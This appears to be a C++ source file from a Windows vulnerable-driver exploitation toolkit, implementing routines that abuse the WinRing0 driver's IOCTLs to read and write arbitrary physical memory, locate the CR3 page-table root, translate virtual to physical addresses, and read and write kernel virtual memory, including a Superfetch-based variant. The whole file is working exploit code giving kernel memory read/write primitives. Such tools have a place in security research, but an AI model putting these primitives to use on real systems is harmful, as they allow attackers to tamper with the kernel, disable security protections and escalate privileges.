/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2026
*
*  TITLE:       WINRING0.CPP
*
*  VERSION:     1.50
*
*  DATE:        19 Jul 2026
*
*  WinRing0 based drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/winring0.h"

//
// WARNING, (BUG)FEATURE ALERT
// 
// WinRing0 crapware does not check API call results.
// This will eventually lead to BSOD in case of mapping failure.
//

/*
* WRZeroReadPhysicalMemory
*
* Purpose:
*
* Read physical memory through MmMapIoSpace.
*
*/
BOOL WRZeroReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    OLS_READ_MEMORY_INPUT request;

    request.Address.QuadPart = PhysicalAddress;
    request.UnitSize = 1;
    request.Count = NumberOfBytes;

    return supCallDriver(DeviceHandle,
        IOCTL_OLS_READ_MEMORY,
        &request,
        sizeof(OLS_READ_MEMORY_INPUT),
        Buffer,
        NumberOfBytes);
}

/*
* WRZeroWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI WRZeroWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    SIZE_T size;
    ULONG value;
    DWORD dwError = ERROR_SUCCESS;
    OLS_WRITE_MEMORY_INPUT* pRequest;

    value = FIELD_OFFSET(OLS_WRITE_MEMORY_INPUT, Data) + NumberOfBytes;
    size = ALIGN_UP_BY(value, PAGE_SIZE);

    pRequest = (OLS_WRITE_MEMORY_INPUT*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->Address.QuadPart = PhysicalAddress;
        pRequest->UnitSize = 1;
        pRequest->Count = NumberOfBytes;
        RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);

        bResult = supCallDriver(DeviceHandle,
            IOCTL_OLS_WRITE_MEMORY,
            pRequest,
            (ULONG)size,
            NULL,
            0);

        if (!bResult)
            dwError = GetLastError();

        supFreeLockedMemory(pRequest, size);
    }

    SetLastError(dwError);
    return bResult;
}

/*
* WRZeroQueryRootTableValue
*
* Purpose:
*
* Locate CR3 root paging table value.
*
*/
BOOL WINAPI WRZeroQueryRootTableValue(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD dwError = ERROR_SUCCESS;
    DWORD cbSize = 0x100000;
    ULONG_PTR rootTable = 0;
    UCHAR* pbLowStub1M;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    do {

        pbLowStub1M = (UCHAR*)supHeapAlloc(cbSize);
        if (pbLowStub1M == NULL) {
            dwError = GetLastError();
            break;
        }

        for (ULONG_PTR i = 0; i < cbSize; i += PAGE_SIZE) {

            if (!WRZeroReadPhysicalMemory(DeviceHandle,
                i,
                RtlOffsetToPointer(pbLowStub1M, i),
                PAGE_SIZE))
            {
                dwError = GetLastError();
                break;
            }

        }

        if (dwError == ERROR_SUCCESS) {

            rootTable = supGetRootTableFromLowStub1M((ULONG_PTR)pbLowStub1M);
            if (rootTable)
                *Value = rootTable;

        }

    } while (FALSE);

    if (pbLowStub1M)
        supHeapFree(pbLowStub1M);

    SetLastError(dwError);
    return (rootTable != 0);
}

/*
* WRZeroVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI WRZeroVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysicalEx(g_UseLA57, 
        DeviceHandle,
        WRZeroQueryRootTableValue,
        WRZeroReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* WRZeroReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI WRZeroReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = WRZeroVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WRZeroReadPhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes);

    }

    return bResult;
}

/*
* WRZeroWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI WRZeroWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = WRZeroVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WRZeroWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes);

    }

    return bResult;
}

/*
* WinHdDrvVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to physical via Superfetch map.
*
*/
BOOL WINAPI WinHdDrvVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return supVirtualToPhysicalWithSuperfetch(VirtualAddress, PhysicalAddress);
}

/*
* WinHdDrvReadKernelVirtualMemory
*
* Purpose:
*
* Read kernel virtual memory via Superfetch translation + physical memory read.
*
*/
BOOL WINAPI WinHdDrvReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supReadKernelVirtualMemoryWithSuperfetch(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes,
        WRZeroReadPhysicalMemory);
}

/*
* WinHdDrvWriteKernelVirtualMemory
*
* Purpose:
*
* Write kernel virtual memory via Superfetch translation + physical memory write.
*
*/
BOOL WINAPI WinHdDrvWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supWriteKernelVirtualMemoryWithSuperfetch(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes,
        WRZeroWritePhysicalMemory);
}
